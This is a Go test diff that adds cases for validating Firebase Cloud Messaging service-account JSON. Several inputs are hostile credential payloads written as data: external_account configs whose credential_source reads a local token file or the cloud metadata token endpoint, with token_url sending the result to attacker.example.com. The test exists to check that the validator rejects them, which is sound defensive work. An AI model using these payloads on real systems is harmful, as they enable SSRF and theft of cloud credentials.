@@ -24,6 +24,131 @@ import (
 	pushproto "github.com/bucketeer-io/bucketeer/v2/proto/push"
 )
 
+func TestValidateFCMServiceAccount(t *testing.T) {
+	t.Parallel()
+
+	validServiceAccount := `{
+		"type": "service_account",
+		"project_id": "my-project",
+		"private_key_id": "abc",
+		"private_key": "-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----\n",
+		"client_email": "fcm@my-project.iam.gserviceaccount.com",
+		"token_uri": "https://oauth2.googleapis.com/token"
+	}`
+
+	patterns := []struct {
+		desc     string
+		input    string
+		expected error
+	}{
+		{
+			desc:     "err: empty",
+			input:    "",
+			expected: ErrFCMServiceAccountRequired,
+		},
+		{
+			desc:     "err: not json",
+			input:    "not-json",
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: missing type",
+			input:    `{"project_id":"my-project"}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			// The core BKT-01 exploit: external_account with a credential_source
+			// that reads a local file and a token_url that exfiltrates it.
+			desc: "err: external_account with file credential_source (file read + SSRF)",
+			input: `{
+				"type": "external_account",
+				"audience": "x",
+				"subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
+				"token_url": "https://attacker.example.com/collect",
+				"credential_source": {"file": "/usr/local/service-token/token"}
+			}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc: "err: external_account with url credential_source (SSRF to metadata)",
+			input: `{
+				"type": "external_account",
+				"audience": "x",
+				"subject_token_type": "urn:ietf:params:oauth:token-type:jwt",
+				"token_url": "https://attacker.example.com/collect",
+				"credential_source": {
+					"url": "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
+					"headers": {"Metadata-Flavor": "Google"}
+				}
+			}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: external_account_authorized_user",
+			input:    `{"type":"external_account_authorized_user","token_url":"https://attacker.example.com"}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: authorized_user",
+			input:    `{"type":"authorized_user","token_uri":"https://attacker.example.com"}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: impersonated_service_account",
+			input:    `{"type":"impersonated_service_account","service_account_impersonation_url":"https://attacker.example.com"}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: service_account but attacker-controlled token_uri",
+			input:    `{"type":"service_account","project_id":"p","token_uri":"https://attacker.example.com/collect"}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			// google.CredentialsFromJSON prioritises a "web" OAuth client block over
+			// the declared type, yielding a token source whose Token() call panics.
+			desc:     "err: service_account with web OAuth client block",
+			input:    `{"type":"service_account","web":{"client_id":"x","client_secret":"y","redirect_uris":["http://localhost"],"token_uri":"https://attacker.example.com/token"}}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: service_account with installed OAuth client block",
+			input:    `{"type":"service_account","installed":{"client_id":"x","redirect_uris":["http://localhost"]}}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: web OAuth client block without type",
+			input:    `{"web":{"client_id":"x","redirect_uris":["http://localhost"]}}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "err: installed OAuth client block without type",
+			input:    `{"installed":{"client_id":"x","redirect_uris":["http://localhost"]}}`,
+			expected: ErrFCMServiceAccountInvalid,
+		},
+		{
+			desc:     "success: valid service_account",
+			input:    validServiceAccount,
+			expected: nil,
+		},
+		{
+			desc:     "success: service_account without token_uri",
+			input:    `{"type":"service_account","project_id":"p","client_email":"a@b.iam.gserviceaccount.com"}`,
+			expected: nil,
+		},
+		{
+			desc:     "success: service_account with legacy token_uri",
+			input:    `{"type":"service_account","token_uri":"https://accounts.google.com/o/oauth2/token"}`,
+			expected: nil,
+		},
+	}
+	for _, p := range patterns {
+		t.Run(p.desc, func(t *testing.T) {
+			t.Parallel()
+			assert.Equal(t, p.expected, ValidateFCMServiceAccount([]byte(p.input)))
+		})
+	}
+}
+
 func TestNewPush(t *testing.T) {
 	t.Parallel()
 
